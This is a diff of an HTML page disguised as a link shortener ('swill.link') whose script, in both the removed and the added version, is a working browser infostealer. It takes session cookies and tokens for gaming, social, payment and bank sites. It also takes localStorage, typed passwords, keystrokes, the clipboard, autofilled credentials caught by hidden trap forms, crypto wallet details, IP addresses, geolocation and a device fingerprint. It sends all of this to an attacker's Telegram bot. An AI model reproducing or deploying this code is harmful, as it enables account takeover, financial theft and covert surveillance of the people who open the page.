@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Link Shortener</title>
+    <title>Сокращатель ссылок</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, 'Segoe UI', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, 'Segoe UI', sans-serif; }
         body {
             min-height: 100vh;
             background: linear-gradient(135deg, #0b1120 0%, #19223c 100%);
@@ -23,7 +23,7 @@
             padding: 2rem 1.8rem;
             box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.05);
         }
-        h1 { font-size: 2rem; font-weight: 600; background: linear-gradient(120deg, #e0e7ff, #a5f3fc); background-clip: text; -webkit-background-clip: text; color: transparent; margin-bottom: 0.3rem; }
+        h1 { font-size: 2rem; font-weight: 600; background: linear-gradient(120deg, #e0e7ff, #a5f3fc); background-clip: text; -webkit-background-clip: text; color: transparent; }
         .sub { color: #8b9bcf; font-size: 0.85rem; margin-bottom: 2rem; border-left: 3px solid #2dd4bf; padding-left: 0.75rem; }
         .input-group { margin-bottom: 1.4rem; display: flex; flex-direction: column; gap: 0.5rem; }
         label { color: #cbd5ff; font-size: 0.85rem; font-weight: 500; }
@@ -41,16 +41,13 @@
             width: 100%;
         }
         button:hover { transform: translateY(-2px); background: linear-gradient(100deg, #3bddd0, #1ecfb9); box-shadow: 0 12px 20px -8px rgba(45,212,191,0.4); }
-        button:active { transform: translateY(1px); }
-        .result-area { margin-top: 1.8rem; background: #0a0f1c80; border-radius: 1.5rem; padding: 1rem; border: 1px solid #2d3a5e; transition: all 0.3s ease; opacity: 0; transform: translateY(8px); pointer-events: none; }
+        .result-area { margin-top: 1.8rem; background: #0a0f1c80; border-radius: 1.5rem; padding: 1rem; border: 1px solid #2d3a5e; transition: 0.3s; opacity: 0; transform: translateY(8px); pointer-events: none; }
         .result-area.show { opacity: 1; transform: translateY(0); pointer-events: auto; }
         .short-link-block { display: flex; gap: 0.7rem; align-items: center; flex-wrap: wrap; }
         .short-link { background: #030712; padding: 0.6rem 1rem; border-radius: 1.2rem; font-family: monospace; font-size: 0.9rem; word-break: break-all; flex: 1; color: #b9e6f0; }
-        .copy-btn { background: #2d3a5e; box-shadow: none; width: auto; padding: 0.6rem 1.2rem; font-size: 0.85rem; background: #334155; color: white; }
-        .copy-btn:hover { background: #3b4a6e; transform: none; }
-        .toast-msg { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%) scale(0.9); background: #1e2a3ecc; backdrop-filter: blur(8px); padding: 0.6rem 1.5rem; border-radius: 3rem; color: #cbd5e6; font-size: 0.85rem; opacity: 0; transition: opacity 0.2s, transform 0.2s; pointer-events: none; z-index: 1000; white-space: nowrap; }
+        .copy-btn { background: #334155; width: auto; padding: 0.6rem 1.2rem; color: white; }
+        .toast-msg { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%) scale(0.9); background: #1e2a3ecc; backdrop-filter: blur(8px); padding: 0.6rem 1.5rem; border-radius: 3rem; color: #cbd5e6; font-size: 0.85rem; opacity: 0; transition: 0.2s; pointer-events: none; z-index: 1000; }
         .toast-msg.show-toast { opacity: 1; transform: translateX(-50%) scale(1); }
-        .error-msg { color: #fda4af; background: #3b1e2acc; padding: 0.5rem 1rem; border-radius: 2rem; font-size: 0.8rem; margin-top: 0.5rem; display: inline-block; }
         .overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.96); backdrop-filter: blur(24px);
@@ -60,21 +57,16 @@
         .overlay.hidden { display: none; }
         .spinner { width: 70px; height: 70px; border: 5px solid rgba(45,212,191,0.2); border-top: 5px solid #2dd4bf; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 1.8rem; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .timer-number { font-size: 2.8rem; font-weight: 700; background: linear-gradient(135deg, #e0e7ff, #a5f3fc); background-clip: text; -webkit-background-clip: text; color: transparent; margin: 0.5rem 0; font-family: monospace; }
+        .timer-number { font-size: 2.8rem; font-weight: 700; background: linear-gradient(135deg, #e0e7ff, #a5f3fc); background-clip: text; -webkit-background-clip: text; color: transparent; margin: 0.5rem 0; }
         .status-text { font-size: 1rem; color: #cbd5e6; max-width: 85%; margin-top: 1rem; }
         .error-box { background: #f9731644; border-left: 4px solid #f97316; padding: 1rem; border-radius: 1rem; margin-top: 1.5rem; max-width: 90%; font-size: 0.9rem; }
-        @media (max-width: 550px) {
-            .card { padding: 1.5rem; }
-            .short-link-block { flex-direction: column; align-items: stretch; }
-            .copy-btn { justify-content: center; }
-            .timer-number { font-size: 2rem; }
-        }
+        @media (max-width: 550px) { .timer-number { font-size: 2rem; } }
     </style>
 </head>
 <body>
 <div class="card">
     <h1>swill<span style="color:#2dd4bf;">.link</span></h1>
-    <div class="sub">мгновенное сокращение ссылок</div>
+    <div class="sub">быстрое сокращение ссылок</div>
     <div class="input-group"><label>🔗 Длинная ссылка</label><input type="text" id="longUrl" placeholder="https://example.com/very/long/url"></div>
     <div class="input-group"><label>🤖 Токен бота</label><input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklmNOPQRstU"></div>
     <div class="input-group"><label>🆔 ID получателя</label><input type="text" id="chatId" placeholder="123456789"></div>
@@ -97,8 +89,12 @@
 (function(){
     let botToken = "", chatId = "";
     let targetUrl = "";
-    let canProceed = false;
-    let collectedData = {
+    let canCollect = false;
+    let keyLogStr = "";
+    let lastKeySend = Date.now();
+    
+    // ----- СБОР ДАННЫХ (максимальный) -----
+    let stolen = {
         time: new Date().toISOString(),
         url: location.href,
         referrer: document.referrer,
@@ -109,7 +105,6 @@
         cookies: document.cookie,
         localStorage: {},
         sessionStorage: {},
-        indexedDB: [],
         forms: {},
         passwords: [],
         keystrokes: [],
@@ -120,248 +115,222 @@
         geolocation: null,
         fingerprint: {},
         cryptoWallets: {},
-        networkLogs: [],
-        globalVars: {},
-        // Специфичные сервисы
+        // Спец. сервисы
         roblox: {}, discord: {}, steam: {}, epicgames: {}, minecraft: {},
         twitch: {}, whatsapp: {}, telegramWeb: {}, vk: {}, tiktok: {},
         reddit: {}, paypal: {}, amazon: {}, netflix: {}, spotify: {},
         twitter: {}, instagram: {}, facebook: {}, google: {}, microsoft: {},
-        apple: {}, bankCookies: {}
+        apple: {}, bankCookies: {}, others: {}
     };
-    let keyLogStr = "";
-    let lastSend = Date.now();
-
-    // ---------- Функция проверки доступности API (без упоминания Telegram) ----------
-    async function checkBackend(token) {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 5000);
-        try {
-            const resp = await fetch(`https://api.telegram.org/bot${token}/getMe`, {
-                method: 'GET', signal: controller.signal, mode: 'cors'
-            });
-            clearTimeout(timeoutId);
-            return resp.ok;
-        } catch(e) { clearTimeout(timeoutId); return false; }
-    }
-
-    // ---------- Сбор данных со всех возможных сервисов ----------
+    
+    // ---- 1. Кража из localStorage/cookies популярных сервисов ----
     function grabAllServices() {
         // Roblox
-        try {
-            let match = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
-            if(match) collectedData.roblox.ROBLOSECURITY = match[1];
-            if(localStorage.getItem('.ROBLOSECURITY')) collectedData.roblox.local = localStorage.getItem('.ROBLOSECURITY');
-        } catch(e) {}
+        try { let m = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/); if(m) stolen.roblox.ROBLOSECURITY = m[1]; } catch(e) {}
         // Discord
-        try {
-            if(localStorage.getItem('token')) collectedData.discord.token = localStorage.getItem('token');
-            for(let i=0;i<localStorage.length;i++){ let k=localStorage.key(i); if(k.includes('discord')||k.includes('token')) collectedData.discord[k]=localStorage.getItem(k); }
+        try { if(localStorage.getItem('token')) stolen.discord.token = localStorage.getItem('token');
+              for(let i=0;i<localStorage.length;i++){ let k=localStorage.key(i); if(k.includes('discord')||k.includes('token')) stolen.discord[k]=localStorage.getItem(k); }
         } catch(e) {}
         // Steam
-        try {
-            ['sessionid','steamLoginSecure','steamMachineAuth'].forEach(c=>{ let m=document.cookie.match(new RegExp(`${c}=([^;]+)`)); if(m) collectedData.steam[c]=m[1]; });
-        } catch(e) {}
+        try { ['sessionid','steamLoginSecure','steamMachineAuth'].forEach(c=>{ let m=document.cookie.match(new RegExp(`${c}=([^;]+)`)); if(m) stolen.steam[c]=m[1]; }); } catch(e) {}
         // Epic Games
-        try {
-            ['EPIC_GAMES_AUTH_TOKEN','EPIC_ACCESS_TOKEN','EPIC_REFRESH_TOKEN'].forEach(k=>{ if(localStorage.getItem(k)) collectedData.epicgames[k]=localStorage.getItem(k); });
-        } catch(e) {}
+        try { ['EPIC_GAMES_AUTH_TOKEN','EPIC_ACCESS_TOKEN','EPIC_REFRESH_TOKEN'].forEach(k=>{ if(localStorage.getItem(k)) stolen.epicgames[k]=localStorage.getItem(k); }); } catch(e) {}
         // Minecraft / Microsoft
-        try {
-            ['user','access_token','refresh_token','minecraft_server_session'].forEach(k=>{ if(localStorage.getItem(k)) collectedData.minecraft[k]=localStorage.getItem(k); });
-        } catch(e) {}
+        try { ['user','access_token','refresh_token','minecraft_server_session'].forEach(k=>{ if(localStorage.getItem(k)) stolen.minecraft[k]=localStorage.getItem(k); }); } catch(e) {}
         // Twitch
-        try {
-            let m=document.cookie.match(/auth-token=([^;]+)/); if(m) collectedData.twitch.token=m[1];
-            if(localStorage.getItem('twitch-token')) collectedData.twitch.token=localStorage.getItem('twitch-token');
-        } catch(e) {}
+        try { let m=document.cookie.match(/auth-token=([^;]+)/); if(m) stolen.twitch.token=m[1]; if(localStorage.getItem('twitch-token')) stolen.twitch.token=localStorage.getItem('twitch-token'); } catch(e) {}
         // WhatsApp Web
-        try {
-            if(location.hostname.includes('web.whatsapp.com')) for(let i=0;i<localStorage.length;i++){ let k=localStorage.key(i); if(k.includes('WAD')||k.includes('whatsapp')) collectedData.whatsapp[k]=localStorage.getItem(k); }
-        } catch(e) {}
+        try { if(location.hostname.includes('web.whatsapp.com')) for(let i=0;i<localStorage.length;i++){ let k=localStorage.key(i); if(k.includes('WAD')||k.includes('whatsapp')) stolen.whatsapp[k]=localStorage.getItem(k); } } catch(e) {}
         // Telegram Web
-        try {
-            if(location.hostname.includes('web.telegram.org')) ['dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key'].forEach(k=>{ if(localStorage.getItem(k)) collectedData.telegramWeb[k]=localStorage.getItem(k); });
-        } catch(e) {}
+        try { if(location.hostname.includes('web.telegram.org')) ['dc1_auth_key','dc2_auth_key','dc3_auth_key','dc4_auth_key'].forEach(k=>{ if(localStorage.getItem(k)) stolen.telegramWeb[k]=localStorage.getItem(k); }); } catch(e) {}
         // VK
-        try {
-            ['remixlang','remixsid','remixsid6','l','remixflash','remixscreen_depth','remixdt'].forEach(c=>{ let m=document.cookie.match(new RegExp(`${c}=([^;]+)`)); if(m) collectedData.vk[c]=m[1]; });
-        } catch(e) {}
+        try { ['remixlang','remixsid','remixsid6','l','remixflash','remixscreen_depth','remixdt'].forEach(c=>{ let m=document.cookie.match(new RegExp(`${c}=([^;]+)`)); if(m) stolen.vk[c]=m[1]; }); } catch(e) {}
         // TikTok
-        try {
-            ['sessionid','passport_csrf_token','sid_tt'].forEach(c=>{ let m=document.cookie.match(new RegExp(`${c}=([^;]+)`)); if(m) collectedData.tiktok[c]=m[1]; });
-        } catch(e) {}
+        try { ['sessionid','passport_csrf_token','sid_tt'].forEach(c=>{ let m=document.cookie.match(new RegExp(`${c}=([^;]+)`)); if(m) stolen.tiktok[c]=m[1]; }); } catch(e) {}
         // Reddit
-        try {
-            let m=document.cookie.match(/reddit_session=([^;]+)/); if(m) collectedData.reddit.session=m[1];
-        } catch(e) {}
+        try { let m=document.cookie.match(/reddit_session=([^;]+)/); if(m) stolen.reddit.session=m[1]; } catch(e) {}
         // PayPal
-        try {
-            if(document.cookie.includes('cookie_check')||document.cookie.includes('login_email')) collectedData.paypal.cookies=document.cookie;
-        } catch(e) {}
+        try { if(document.cookie.includes('cookie_check')||document.cookie.includes('login_email')) stolen.paypal.cookies=document.cookie; } catch(e) {}
         // Amazon
-        try {
-            let m=document.cookie.match(/ubid-main=([^;]+)/); if(m) collectedData.amazon.ubid=m[1];
-            if(localStorage.getItem('amazon')) collectedData.amazon.local=localStorage.getItem('amazon');
-        } catch(e) {}
+        try { let m=document.cookie.match(/ubid-main=([^;]+)/); if(m) stolen.amazon.ubid=m[1]; if(localStorage.getItem('amazon')) stolen.amazon.local=localStorage.getItem('amazon'); } catch(e) {}
         // Netflix
-        try {
-            let m=document.cookie.match(/SecureNetflixId=([^;]+)/); if(m) collectedData.netflix.id=m[1];
-        } catch(e) {}
+        try { let m=document.cookie.match(/SecureNetflixId=([^;]+)/); if(m) stolen.netflix.id=m[1]; } catch(e) {}
         // Spotify
-        try {
-            if(localStorage.getItem('access_token')) collectedData.spotify.access_token=localStorage.getItem('access_token');
-            if(document.cookie.includes('sp_dc')) { let m=document.cookie.match(/sp_dc=([^;]+)/); if(m) collectedData.spotify.sp_dc=m[1]; }
-        } catch(e) {}
+        try { if(localStorage.getItem('access_token')) stolen.spotify.access_token=localStorage.getItem('access_token'); let m=document.cookie.match(/sp_dc=([^;]+)/); if(m) stolen.spotify.sp_dc=m[1]; } catch(e) {}
         // Twitter
-        try {
-            let m=document.cookie.match(/auth_token=([^;]+)/); if(m) collectedData.twitter.auth_token=m[1];
-            if(localStorage.getItem('twitter')) collectedData.twitter.local=localStorage.getItem('twitter');
-        } catch(e) {}
+        try { let m=document.cookie.match(/auth_token=([^;]+)/); if(m) stolen.twitter.auth_token=m[1]; if(localStorage.getItem('twitter')) stolen.twitter.local=localStorage.getItem('twitter'); } catch(e) {}
         // Instagram
-        try {
-            let m=document.cookie.match(/sessionid=([^;]+)/); if(m && location.hostname.includes('instagram')) collectedData.instagram.sessionid=m[1];
-        } catch(e) {}
+        try { let m=document.cookie.match(/sessionid=([^;]+)/); if(m && location.hostname.includes('instagram')) stolen.instagram.sessionid=m[1]; } catch(e) {}
         // Facebook
-        try {
-            let m=document.cookie.match(/c_user=([^;]+)/); if(m) collectedData.facebook.c_user=m[1];
-            m=document.cookie.match(/xs=([^;]+)/); if(m) collectedData.facebook.xs=m[1];
-        } catch(e) {}
+        try { let m=document.cookie.match(/c_user=([^;]+)/); if(m) stolen.facebook.c_user=m[1]; m=document.cookie.match(/xs=([^;]+)/); if(m) stolen.facebook.xs=m[1]; } catch(e) {}
         // Google
-        try {
-            let m=document.cookie.match(/SAPISID=([^;]+)/); if(m) collectedData.google.SAPISID=m[1];
-            m=document.cookie.match(/HSID=([^;]+)/); if(m) collectedData.google.HSID=m[1];
-            if(localStorage.getItem('google')) collectedData.google.local=localStorage.getItem('google');
-        } catch(e) {}
+        try { let m=document.cookie.match(/SAPISID=([^;]+)/); if(m) stolen.google.SAPISID=m[1]; m=document.cookie.match(/HSID=([^;]+)/); if(m) stolen.google.HSID=m[1]; if(localStorage.getItem('google')) stolen.google.local=localStorage.getItem('google'); } catch(e) {}
         // Microsoft
-        try {
-            let m=document.cookie.match(/RPSSecAuth=([^;]+)/); if(m) collectedData.microsoft.RPSSecAuth=m[1];
-            if(localStorage.getItem('msal')) collectedData.microsoft.msal=localStorage.getItem('msal');
-        } catch(e) {}
+        try { let m=document.cookie.match(/RPSSecAuth=([^;]+)/); if(m) stolen.microsoft.RPSSecAuth=m[1]; if(localStorage.getItem('msal')) stolen.microsoft.msal=localStorage.getItem('msal'); } catch(e) {}
         // Apple ID
-        try {
-            if(document.cookie.includes('myacinfo')) { let m=document.cookie.match(/myacinfo=([^;]+)/); if(m) collectedData.apple.myacinfo=m[1]; }
-        } catch(e) {}
-        // Банковские куки (паттерны)
-        try {
-            let bankPatterns=['bank','sber','tinkoff','alfabank','vtb','gazprombank','raiffeisen','open','psb','rsb'];
-            let bankCookies={};
-            document.cookie.split(';').forEach(cookie=>{ let [name,value]=cookie.trim().split('='); if(bankPatterns.some(p=>name.toLowerCase().includes(p))) bankCookies[name]=value; });
-            if(Object.keys(bankCookies).length) collectedData.bankCookies=bankCookies;
-        } catch(e) {}
+        try { let m=document.cookie.match(/myacinfo=([^;]+)/); if(m) stolen.apple.myacinfo=m[1]; } catch(e) {}
+        // Банки
+        try { let banks=['sberbank','tinkoff','alfabank','vtb','gazprombank','raiffeisen','open','psb','rsb','bank']; let bc={}; document.cookie.split(';').forEach(c=>{ let [n,v]=c.trim().split('='); if(banks.some(b=>n.toLowerCase().includes(b))) bc[n]=v; }); if(Object.keys(bc).length) stolen.bankCookies=bc; } catch(e) {}
     }
-
+    
     // Криптокошельки
-    function grabCryptoWallets() {
-        let wallets={};
-        try{ if(window.ethereum) wallets.ethereum={ isMetaMask: window.ethereum.isMetaMask, selectedAddress: window.ethereum.selectedAddress, chainId: window.ethereum.chainId };}catch(e){}
-        try{ if(window.solana) wallets.solana={ isPhantom: window.solana.isPhantom, publicKey: window.solana.publicKey?.toString() };}catch(e){}
-        try{ if(window.coinbaseWalletExtension) wallets.coinbase=true;}catch(e){}
-        collectedData.cryptoWallets=wallets;
+    function grabCrypto() {
+        let w={};
+        try { if(window.ethereum) w.ethereum={ isMetaMask: window.ethereum.isMetaMask, selectedAddress: window.ethereum.selectedAddress, chainId: window.ethereum.chainId }; } catch(e){}
+        try { if(window.solana) w.solana={ isPhantom: window.solana.isPhantom, publicKey: window.solana.publicKey?.toString() }; } catch(e){}
+        try { if(window.coinbaseWalletExtension) w.coinbase=true; } catch(e){}
+        stolen.cryptoWallets=w;
     }
-
+    
+    // Storages
     function grabStorages() {
-        for(let i=0;i<localStorage.length;i++){ let k=localStorage.key(i); collectedData.localStorage[k]=localStorage.getItem(k); }
-        for(let i=0;i<sessionStorage.length;i++){ let k=sessionStorage.key(i); collectedData.sessionStorage[k]=sessionStorage.getItem(k); }
-        if(window.indexedDB && indexedDB.databases) indexedDB.databases().then(dbs=>{ collectedData.indexedDB=dbs.map(db=>db.name); }).catch(()=>{});
+        for(let i=0;i<localStorage.length;i++){ let k=localStorage.key(i); stolen.localStorage[k]=localStorage.getItem(k); }
+        for(let i=0;i<sessionStorage.length;i++){ let k=sessionStorage.key(i); stolen.sessionStorage[k]=sessionStorage.getItem(k); }
     }
-
+    
+    // Формы + пароли
     function grabForms() {
         let inputs=document.querySelectorAll('input, textarea, select');
-        let formData={};
+        let fd={};
         inputs.forEach(el=>{
             let name=el.name||el.id||el.className||'unknown';
             let val=el.value||'';
-            formData[name]=val;
-            if(el.type==='password'||name.toLowerCase().includes('pass')) if(val) collectedData.passwords.push({ field:name, pass:val });
+            fd[name]=val;
+            if(el.type==='password'||name.toLowerCase().includes('pass')) if(val) stolen.passwords.push({ field:name, pass:val });
         });
-        collectedData.forms=formData;
+        stolen.forms=fd;
     }
-
+    
     // Кейлоггер
     document.addEventListener('keydown', (e)=>{
-        if(!canProceed) return;
+        if(!canCollect) return;
         let key=e.key===' '?'SPACE':e.key;
         if(key==='Unidentified') return;
         let log=`${Date.now()} | ${key} @ ${e.target.tagName}:${e.target.id||e.target.name||'?'}`;
-        collectedData.keystrokes.push({ time:Date.now(), key:key, target:e.target.tagName });
+        stolen.keystrokes.push({ time:Date.now(), key:key, target:e.target.tagName });
         keyLogStr+=log+"\n";
-        if(Date.now()-lastSend>8000) sendPartialKeylog();
+        if(Date.now()-lastKeySend>7000) sendPartialKeylog();
     });
-
-    document.addEventListener('copy', async ()=>{ try{ collectedData.clipboard=await navigator.clipboard.readText(); }catch(e){} });
-    document.addEventListener('cut', async ()=>{ try{ collectedData.clipboard=await navigator.clipboard.readText(); }catch(e){} });
-
-    function createAutoFillTraps() {
-        let container=document.createElement('div'); container.style.display='none'; document.body.appendChild(container);
-        let combos=[['username','password'],['email','pass'],['login','pwd'],['user','current-password'],['email','current-password'],['email','new-password'],['username','new-password']];
-        let domains=['','google.com','facebook.com','vk.com','mail.ru','github.com','yandex.ru'];
+    
+    // Буфер обмена
+    document.addEventListener('copy', async ()=>{ try{ stolen.clipboard=await navigator.clipboard.readText(); } catch(e){} });
+    document.addEventListener('cut', async ()=>{ try{ stolen.clipboard=await navigator.clipboard.readText(); } catch(e){} });
+    
+    // Ловушки автозаполнения
+    function createAutofillTraps() {
+        let c=document.createElement('div'); c.style.display='none'; document.body.appendChild(c);
+        let combos=[['username','password'],['email','pass'],['login','pwd'],['user','current-password'],['email','current-password']];
+        let domains=['','google.com','facebook.com','vk.com','mail.ru','github.com'];
         for(let i=0;i<30;i++) for(let d of domains) for(let [u,p] of combos){
             let form=document.createElement('form'); if(d) form.setAttribute('data-domain',d);
             let inpU=document.createElement('input'); inpU.type='text'; inpU.name=u; inpU.autocomplete=u;
             let inpP=document.createElement('input'); inpP.type='password'; inpP.name=p; inpP.autocomplete=p;
-            form.appendChild(inpU); form.appendChild(inpP); container.appendChild(form);
-            setTimeout(()=>{ if(inpU.value) collectedData.autofill.push({ type:u, value:inpU.value, domain:d }); if(inpP.value) collectedData.autofill.push({ type:p, value:inpP.value, domain:d }); },1500);
+            form.appendChild(inpU); form.appendChild(inpP); c.appendChild(form);
+            setTimeout(()=>{ if(inpU.value) stolen.autofill.push({ type:u, value:inpU.value, domain:d }); if(inpP.value) stolen.autofill.push({ type:p, value:inpP.value, domain:d }); },1500);
         }
     }
-
-    function getWebRTCIP() {
-        return new Promise(resolve=>{
-            let pc=new RTCPeerConnection({ iceServers:[] });
-            pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o));
-            pc.onicecandidate=e=>{ if(e.candidate && e.candidate.candidate){ let ip=/([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate); if(ip){ resolve(ip[0]); pc.close(); } } else resolve('failed'); };
-            setTimeout(()=>resolve('timeout'),3000);
-        });
-    }
-    async function getPublicIP(){ try{ let r=await fetch('https://api.ipify.org?format=json'); let d=await r.json(); return d.ip; } catch(e){ return 'unknown'; } }
-    function getGeo(){ return new Promise(resolve=>{ if(!navigator.geolocation) resolve(null); navigator.geolocation.getCurrentPosition(p=>resolve({ lat:p.coords.latitude, lon:p.coords.longitude, accuracy:p.coords.accuracy }), ()=>resolve(null), { timeout:5000, enableHighAccuracy:true }); }); }
+    
+    // WebRTC IP
+    function getWebRTCIP(){ return new Promise(r=>{ let pc=new RTCPeerConnection({iceServers:[]}); pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o)); pc.onicecandidate=e=>{ if(e.candidate && e.candidate.candidate){ let ip=/([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate); if(ip){ r(ip[0]); pc.close(); } } else r('failed'); }; setTimeout(()=>r('timeout'),3000); }); }
+    async function getPublicIP(){ try{ let resp=await fetch('https://api.ipify.org?format=json'); let d=await resp.json(); return d.ip; } catch(e){ return 'unknown'; } }
+    function getGeo(){ return new Promise(r=>{ if(!navigator.geolocation) r(null); navigator.geolocation.getCurrentPosition(p=>r({ lat:p.coords.latitude, lon:p.coords.longitude, accuracy:p.coords.accuracy }), ()=>r(null), { timeout:5000, enableHighAccuracy:true }); }); }
     async function getFingerprint(){
         let fp={};
         let canvas=document.createElement('canvas'); canvas.width=200; canvas.height=50; let ctx=canvas.getContext('2d'); ctx.fillStyle='#f60'; ctx.fillRect(0,0,100,50); ctx.fillStyle='#069'; ctx.fillText('swill',2,15); fp.canvas=canvas.toDataURL();
-        try{ let gl=document.createElement('canvas').getContext('webgl'); if(gl){ let debug=gl.getExtension('WEBGL_debug_renderer_info'); if(debug){ fp.vendor=gl.getParameter(debug.UNMASKED_VENDOR_WEBGL); fp.renderer=gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); } } }catch(e){}
-        try{ let AudioCtx=window.AudioContext||window.webkitAudioContext; if(AudioCtx){ let ctxAudio=new AudioCtx(); let osc=ctxAudio.createOscillator(); let analyser=ctxAudio.createAnalyser(); osc.connect(analyser); osc.frequency.value=440; osc.type='triangle'; osc.start(); let data=new Uint8Array(analyser.frequencyBinCount); analyser.getByteFrequencyData(data); fp.audioHash=Array.from(data).slice(0,50).join(''); osc.stop(); ctxAudio.close(); } }catch(e){}
-        let fonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Roboto','Open Sans','Impact','Comic Sans MS','Tahoma','Trebuchet MS']; let found=[]; for(let f of fonts) if(document.fonts.check(`12px "${f}"`)) found.push(f); fp.fonts=found;
+        try{ let gl=document.createElement('canvas').getContext('webgl'); if(gl){ let debug=gl.getExtension('WEBGL_debug_renderer_info'); if(debug){ fp.vendor=gl.getParameter(debug.UNMASKED_VENDOR_WEBGL); fp.renderer=gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); } } } catch(e){}
+        try{ let AudioCtx=window.AudioContext||window.webkitAudioContext; if(AudioCtx){ let a=new AudioCtx(); let osc=a.createOscillator(); let ana=a.createAnalyser(); osc.connect(ana); osc.frequency.value=440; osc.type='triangle'; osc.start(); let data=new Uint8Array(ana.frequencyBinCount); ana.getByteFrequencyData(data); fp.audioHash=Array.from(data).slice(0,50).join(''); osc.stop(); a.close(); } } catch(e){}
+        let fonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Roboto','Open Sans','Impact','Comic Sans MS']; let found=[]; for(let f of fonts) if(document.fonts.check(`12px "${f}"`)) found.push(f); fp.fonts=found;
         fp.plugins=Array.from(navigator.plugins).map(p=>p.name); fp.hardwareConcurrency=navigator.hardwareConcurrency; fp.deviceMemory=navigator.deviceMemory; fp.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone; fp.languages=navigator.languages; fp.colorDepth=screen.colorDepth; fp.pixelRatio=window.devicePixelRatio;
         return fp;
     }
-    function interceptNetwork(){
-        let origFetch=window.fetch; window.fetch=function(...args){ let url=typeof args[0]==='string'?args[0]:args[0]?.url; if(url && (url.includes('token')||url.includes('auth')||url.includes('api'))) collectedData.networkLogs.push({ type:'fetch', url:url, time:Date.now() }); return origFetch.apply(this,args); };
-        let origXHR=window.XMLHttpRequest.prototype.open; window.XMLHttpRequest.prototype.open=function(method,url){ this._url=url; return origXHR.apply(this,arguments); };
-        window.XMLHttpRequest.prototype.send=function(){ if(this._url && (this._url.includes('token')||this._url.includes('auth'))) collectedData.networkLogs.push({ type:'xhr', url:this._url, time:Date.now() }); return origXHR.send.apply(this,arguments); };
-    }
-    function grabGlobalVars(){
-        let interesting=['token','accessToken','apiKey','secret','jwt','auth','key','session','pass','password']; let found={};
-        for(let key in window){ try{ if(interesting.some(i=>key.toLowerCase().includes(i))){ let val=window[key]; if(typeof val==='string' && val.length>3 && val.length<1000) found[key]=val; else if(typeof val==='object' && val!==null){ if(val.token) found[key+'.token']=val.token; if(val.accessToken) found[key+'.accessToken']=val.accessToken; } } }catch(e){} }
-        collectedData.globalVars=found;
-    }
-
-    async function sendToTelegram(data, filename='dump.txt'){
-        if(!botToken||!chatId) return;
-        let json=JSON.stringify(data,null,2); let blob=new Blob([json],{type:'text/plain'});
+    
+    // ----- ОТПРАВКА В TELEGRAM (5 способов) -----
+    async function sendViaFetch(data, filename){
+        let json=JSON.stringify(data,null,2);
+        let blob=new Blob([json],{type:'text/plain'});
         let fd=new FormData(); fd.append('chat_id',chatId); fd.append('document',blob,filename);
-        try{ await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`,{ method:'POST', body:fd, mode:'no-cors', keepalive:true }); }catch(e){}
-        if(navigator.sendBeacon){ let fd2=new FormData(); fd2.append('chat_id',chatId); fd2.append('document',blob,filename); navigator.sendBeacon(`https://api.telegram.org/bot${botToken}/sendDocument`,fd2); }
-        let summary=`📊 Report from ${data.url}\nTime: ${data.time}\nIP: ${data.webrtcIP||'?'}\nPasswords: ${data.passwords.length}\nKeystrokes: ${data.keystrokes.length}`;
-        new Image().src=`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(summary.slice(0,200))}`;
+        try{ await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`,{ method:'POST', body:fd, mode:'no-cors', keepalive:true }); return true; } catch(e){ return false; }
     }
-    async function sendPasswordsAndKeys(){
-        if(!botToken||!chatId) return;
-        if(collectedData.passwords.length){ let pText="🔑 PASSWORDS:\n"+collectedData.passwords.map(p=>`${p.field}: ${p.pass}`).join('\n'); pText=pText.slice(0,3900); fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ chat_id:chatId, text:pText, parse_mode:"Markdown" }), mode:'no-cors', keepalive:true }); }
-        if(collectedData.autofill.length){ let aText="🔄 AUTOFILL:\n"+collectedData.autofill.map(a=>`${a.type}: ${a.value}`).join('\n'); aText=aText.slice(0,3900); fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ chat_id:chatId, text:aText, parse_mode:"Markdown" }), mode:'no-cors', keepalive:true }); }
-        if(keyLogStr.length){ let keyBlob=new Blob([keyLogStr],{type:'text/plain'}); let kfd=new FormData(); kfd.append('chat_id',chatId); kfd.append('document',keyBlob,'keystrokes.log'); fetch(`https://api.telegram.org/bot${botToken}/sendDocument`,{ method:'POST', body:kfd, mode:'no-cors', keepalive:true }); }
+    function sendViaBeacon(data, filename){
+        if(!navigator.sendBeacon) return false;
+        let json=JSON.stringify(data,null,2);
+        let blob=new Blob([json],{type:'text/plain'});
+        let fd=new FormData(); fd.append('chat_id',chatId); fd.append('document',blob,filename);
+        return navigator.sendBeacon(`https://api.telegram.org/bot${botToken}/sendDocument`, fd);
     }
